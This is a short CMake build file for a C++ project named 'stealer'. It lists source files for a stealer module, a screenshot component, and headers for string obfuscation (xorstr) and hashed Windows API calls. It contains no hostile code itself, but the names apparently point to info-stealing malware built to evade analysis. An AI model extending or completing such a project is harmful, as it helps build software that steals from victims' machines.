cmake_minimum_required(VERSION 3.28)
project(stealer)

set(CMAKE_CXX_STANDARD 20)

add_definitions(-DDEV=true)

include_directories(include)
link_directories(include)

add_executable(stealer src/main.cpp
        src/stealer/Stealer.cpp
        src/stealer/Stealer.h
        src/stealer/StealerImpl.h
        src/Includes.h
        src/Utils.cpp
        src/Utils.h
        src/stealer/impl/Screenshot.cpp
        src/stealer/impl/Screenshot.h
        include/xorstr.hpp
        include/winapi.cpp
        include/winapi.h
        include/winapi_hash.h
)
